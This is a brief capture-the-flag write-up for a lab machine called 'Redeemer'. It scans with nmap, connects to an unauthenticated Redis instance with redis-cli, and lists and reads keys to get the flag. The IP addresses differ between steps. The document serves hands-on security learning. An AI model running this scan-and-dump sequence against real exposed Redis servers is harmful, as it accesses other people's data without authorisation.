# Redeemer
### Summary
Server running Redis, (mis)configured to allow access from anyone without authentication.

From redis.io:
> Redis is designed to be accessed by trusted clients inside trusted environments. This means that usually it is not a good idea to expose the Redis instance directly to the internet [...]

---

IP: 10.129.111.152

### Scanning
`nmap 10.129.111.152` (most common 1000 ports)
> All 1000 scanned ports on 10.129.242.171 are in ignored states. \
Not shown: 1000 closed tcp ports (conn-refused)

`nmap -p- -sV 10.129.111.152` (all ports)
> PORT     STATE SERVICE VERSION \
6379/tcp open  redis   Redis key-value store 5.0.7

redis in-memory key-value database


### Redis
`redis-cli -h 10.129.208.50 -p 6379` connects without authentication.

Only one database found with `redis> INFO`.

Find all keys \
`redis> KEYS *`
>1\) "stor" \
2\) "numb" \
3\) "flag" <<\
4\) "temp"


### Flag
`redis> GET flag`
